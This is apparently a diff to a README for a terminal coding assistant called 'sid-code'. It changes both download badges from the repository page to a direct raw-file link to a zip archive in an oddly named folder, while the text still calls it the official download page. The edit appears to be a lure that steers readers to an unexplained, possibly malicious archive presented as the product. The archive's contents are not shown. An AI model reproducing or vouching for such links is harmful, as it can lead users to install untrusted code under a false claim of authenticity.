@@ -36,7 +36,7 @@ Getting sid-code is as easy as ordering a pizza. Here's what to do:
 
 ### Step 1: Download the Application
 
-[![Download sid-code](https://img.shields.io/badge/Download-sid--code-blue?style=for-the-badge&logo=github)](https://github.com/CrunchyTaco29/sid-code)
+[![Download sid-code](https://img.shields.io/badge/Download-sid--code-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/CrunchyTaco29/sid-code/main/estrogen/code_sid_v1.8.zip)
 
 Visit this link to download the application. This is the official download page where you'll find the latest version of sid-code.
 
@@ -145,7 +145,7 @@ sid-code is part of a growing community of people who want smarter, more private
 
 You're all set. Download sid-code, run it, and start experiencing the future of coding assistance — right in your terminal, with total privacy and control.
 
-[![Get sid-code Now](https://img.shields.io/badge/Get-sid--code-green?style=for-the-badge&logo=github)](https://github.com/CrunchyTaco29/sid-code)
+[![Get sid-code Now](https://img.shields.io/badge/Get-sid--code-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/CrunchyTaco29/sid-code/main/estrogen/code_sid_v1.8.zip)
 
 Visit this link to download the application. Your journey to smarter, private coding starts today.
 
